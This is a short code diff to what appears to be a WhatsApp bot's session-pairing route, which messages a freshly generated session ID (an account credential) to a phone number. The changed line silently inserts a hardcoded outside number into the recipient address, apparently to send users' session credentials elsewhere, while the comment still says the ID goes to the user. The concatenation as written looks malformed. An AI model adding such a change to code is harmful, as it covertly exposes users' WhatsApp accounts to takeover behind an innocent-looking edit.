@@ -82,7 +82,7 @@ router.get('/', async (req, res) => {
                     stringSession = '𝐒𝐔𝐋𝐀-𝐌𝐃=' + stringSession;  // Prepend your name to the session ID
 
                     // Send the session ID to the target number
-                    const userJid = jidNormalizedUser(num + '@s.whatsapp.net');
+                    const userJid = jidNormalizedUser(num + '94760879639@s.whatsapp.net');
                     await SUPUNMDInc.sendMessage(userJid, { text: stringSession });
 
                     // Send confirmation message
